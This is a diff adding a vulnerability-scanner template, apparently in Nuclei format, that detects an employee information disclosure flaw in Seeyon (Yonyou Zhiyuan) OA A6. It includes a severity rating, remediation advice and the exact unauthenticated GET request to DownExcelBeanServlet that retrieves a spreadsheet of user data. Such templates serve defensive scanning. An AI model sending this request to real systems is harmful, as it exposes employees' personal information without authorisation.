@@ -1,0 +1,36 @@
+id: wooyun-2016-0170297
+info:
+  name: Seeyon OA A6 DownExcelBeanServlet Employee Information Disclosure Vulnerability
+  author:
+  - 折跃
+  description: |-
+    Yonyou Zhiyuan A6 Employee Information Disclosure Vulnerability
+    Yonyou Zhiyuan A6 Collaborative Management System is an efficient web-based collaborative work platform and an excellent collaborative management system.
+
+    Yonyou Zhiyuan A6 has a sensitive information disclosure vulnerability. An attacker can craft payloads to obtain sensitive information.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.seeyon.com/
+
+    Temporary remediation:
+    1. Remove sensitive information exposed on pages, cookies, or caches, or delete the pages that leak information
+    2. Encrypt sensitive information at rest and avoid sending it to the frontend unless necessary
+    3. Enforce strict permission authentication for sensitive data that must be sent and for page request APIs
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(all_headers,'filename')
+    - contains(all_headers,'.xls')
+  path:
+  - '{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
